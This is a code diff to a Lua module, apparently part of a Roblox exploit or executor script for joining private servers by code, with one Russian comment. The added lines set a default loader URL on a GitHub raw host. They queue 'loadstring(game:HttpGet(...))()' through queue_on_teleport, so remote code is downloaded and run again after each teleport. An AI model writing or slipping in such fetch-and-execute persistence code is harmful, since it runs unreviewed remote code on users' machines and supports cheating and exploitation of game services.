@@ -4,8 +4,24 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local PrivateServer = {}
 PrivateServer.__index = PrivateServer
 
-function PrivateServer.new()
-	return setmetatable({}, PrivateServer)
+function PrivateServer.new(opts)
+	local self = setmetatable({}, PrivateServer)
+	self.loaderUrl = opts and opts.loaderUrl or "https://raw.githubusercontent.com/olegvictsergeyev/san-diego/main/final/agent.lua"
+	self.compat = opts and opts.compat or nil
+	return self
+end
+
+function PrivateServer:_queueReload()
+	local code = 'task.wait(0.5)\nloadstring(game:HttpGet("' .. self.loaderUrl .. '?nocache=" .. tostring(tick())))()'
+	if self.compat and self.compat.queueOnTeleport then
+		return self.compat.queueOnTeleport(code)
+	end
+	local q = queue_on_teleport
+	if typeof(q) ~= "function" then
+		return false
+	end
+	local ok = pcall(q, code)
+	return ok
 end
 
 function PrivateServer:_getRemotesFolder()
@@ -63,6 +79,7 @@ function PrivateServer:joinByCode(code)
 	-- Запускаем в отдельном потоке, потому что успешный телепорт
 	-- может прервать выполнение текущего скрипта.
 	task.spawn(function()
+		self:_queueReload()
 		pcall(function()
 			joinRemote:InvokeServer(code)
 		end)
